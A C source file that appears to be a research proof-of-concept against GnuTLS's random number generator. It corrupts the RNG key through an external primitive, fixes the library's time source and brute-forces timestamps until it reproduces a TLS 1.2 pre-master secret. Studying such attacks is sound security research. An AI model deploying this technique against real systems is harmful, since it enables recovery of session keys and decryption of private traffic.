#include <stdio.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <gnutls/gnutls.h>
#include <gnutls/crypto.h>
#include "libprimitive.h"
#include "logging.h"

/* Shared memory area */
static void *shmem;

/* A standard pre-master secret is 48 bytes */
#define PREMASTER_SECRET_SIZE 48
/* The random portion is the total size minus the 2 version bytes */
#define RANDOM_DATA_SIZE (PREMASTER_SECRET_SIZE - 2)
/* The premaster secret that we are trying to guess */
unsigned char *premaster_secret;

/* The timespec struct that we fill with values to test */
struct timespec *ts;

/* Declarations for setting the time function */
typedef void (*gnutls_gettime_func)(struct timespec *t);
extern void _gnutls_global_set_gettime_function(gnutls_gettime_func gettime_func);

void fixed_gettime(struct timespec *t)
{
    t->tv_nsec = ts->tv_nsec;
    t->tv_sec  = ts->tv_sec;
    //t->tv_nsec = 0;
    //t->tv_sec  = 0;
}

void gen_pms(void)
{
    int ret;
    const char *errstr;

    /* Initialize the GnuTLS global state. */
    ret = gnutls_global_init();
    if (ret < 0) {
        errstr = gnutls_strerror(ret);
        handle_error_no_en("Failed to initialize GnuTLS: %s\n", errstr);
    }
    log("GnuTLS initialized.\n");

    /* Change the gettime function to eliminate the time variable for now */
    //_gnutls_global_set_gettime_function(fixed_gettime);
    //log("Changed gnutls' gettime function.\n");

    /* Verbose */
    log("Generating 48-byte pre-master secret...\n");

    /* Set first two bytes to client's highest supported TLS version */
    premaster_secret[0] = 0x03; /* Major version (TLS 1.2) */
    premaster_secret[1] = 0x03; /* Minor version (TLS 1.2) */

    /* Zap RNG  */
    trigger_overwrite_of_l1_key();

    /* Sample time; wait to print until after we call gnutls_rnd */
    clock_gettime(CLOCK_REALTIME, ts);
    usleep(1000000);

    /*
     * Use GnuTLS's CSPRNG to generate the remaining 46 random bytes.
     * We use GNUTLS_RND_RANDOM, which is intended for generating session
     * keys. This is the first call, so it will also trigger the internal
     * RNG to be seeded by the OS.
     */
    ret = gnutls_rnd(GNUTLS_RND_RANDOM, &premaster_secret[2],
                    RANDOM_DATA_SIZE);
    if (ret < 0) {
        errstr = gnutls_strerror(ret);
        gnutls_global_deinit();
        handle_error_no_en("Failed to generate random data: %s\n", errstr);
    }

    /* Verbose */
    log("Generated Pre-Master Secret (48 bytes):\n");
    hexdump(premaster_secret, PREMASTER_SECRET_SIZE);

    /* Log estimated time stamp */
    log("Estimated timestamp (struct timespec ts):\n"
            "\tts.tv_sec  = %ld\n"
            "\tts.tv_nsec = %ld\n",
            ts->tv_sec, ts->tv_nsec);

    /* Cleanup */
    gnutls_global_deinit();
}

int guess_pms(void)
{
    int ret;
    int match;
    const char *errstr;
    unsigned char test_pms[PREMASTER_SECRET_SIZE];

    /* Initialize the GnuTLS global state. */
    ret = gnutls_global_init();
    if (ret < 0) {
        errstr = gnutls_strerror(ret);
        handle_error_no_en("Failed to initialize GnuTLS: %s\n", errstr);
    }
    log("GnuTLS initialized.\n");

    /* Change the gettime function to eliminate the time variable for now */
    _gnutls_global_set_gettime_function(fixed_gettime);
    log("Changed gnutls' gettime function.\n");

    /* Set first two bytes to client's highest supported TLS version */
    test_pms[0] = 0x03; /* Major version (TLS 1.2) */
    test_pms[1] = 0x03; /* Minor version (TLS 1.2) */

    /* Zap RNG */
    trigger_overwrite_of_l1_key();

    /*
     * Use GnuTLS's CSPRNG to generate the remaining 46 random bytes.
     * We use GNUTLS_RND_RANDOM, which is intended for generating session
     * keys. This is the first call, so it will also trigger the internal
     * RNG to be seeded by the OS.
     */
    ret = gnutls_rnd(GNUTLS_RND_RANDOM, &test_pms[2],
                    RANDOM_DATA_SIZE);
    if (ret < 0) {
        errstr = gnutls_strerror(ret);
        gnutls_global_deinit();
        handle_error_no_en("Failed to generate random data: %s\n", errstr);
    }

    /* Verbose */
    log("Generated Pre-Master Secret (48 bytes):\n");
    hexdump(test_pms, PREMASTER_SECRET_SIZE);

    /* Check if premaster secrets match */
    match = memcmp(premaster_secret, test_pms, PREMASTER_SECRET_SIZE);
    if (match == 0) {
        log("Found a match!\n");
    }

    /* Cleanup */
    gnutls_global_deinit();

    /* 0 if we have a match, !0 if we don't */
    return match;
}

int main(void)
{
    int wstatus;
    pid_t cpid, w;
    long cnt = 0;

    shmem = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    premaster_secret = (unsigned char *)shmem;
    ts = (struct timespec *)((unsigned char *)shmem + PREMASTER_SECRET_SIZE);

    cpid = fork();
    if (cpid == -1) {
        handle_error("fork");
    }

    if (cpid == 0) {  /* Code executed by child */
        gen_pms();
        _exit(0);
    } else {  /* Code executed by parent */
        w = waitpid(cpid, &wstatus, 0);
        if (w == -1) {
            handle_error("waitpid");
        }
    }

    /* Generate the PMS that we are trying to guess */
    //gen_pms();

    /* Try to guess the PMS */
    while (1) {
        cpid = fork();
        if (cpid == -1) {
            handle_error("fork");
        }

        if (cpid == 0) {  /* Code executed by child */
            _exit(guess_pms());
        } else {  /* Code executed by parent */
            w = waitpid(cpid, &wstatus, 0);
            if (w == -1) {
                handle_error("waitpid");
            }

            if (WIFEXITED(wstatus)) {
                if (WEXITSTATUS(wstatus) == 0) {
                    log("Found a match!!");
                    break;
                } else {
                    log("Failed: cnt = %ld, nsec = %ld\n", cnt, ts->tv_nsec);
                    /* It actually looks like it is a second nonce since they
                     * take the min of the sizeof nonce and struct timespec.
                     * See: single_prng_init in lib/nettle/rnd.c */
                    ts->tv_sec++;
                    ts->tv_nsec++;
                    cnt++;
                    //sleep(1.2);
                    continue;
                }
            } else {
                handle_error("Child disruption!");
            }
        }
    }

    /* All done */
    return 0;
}
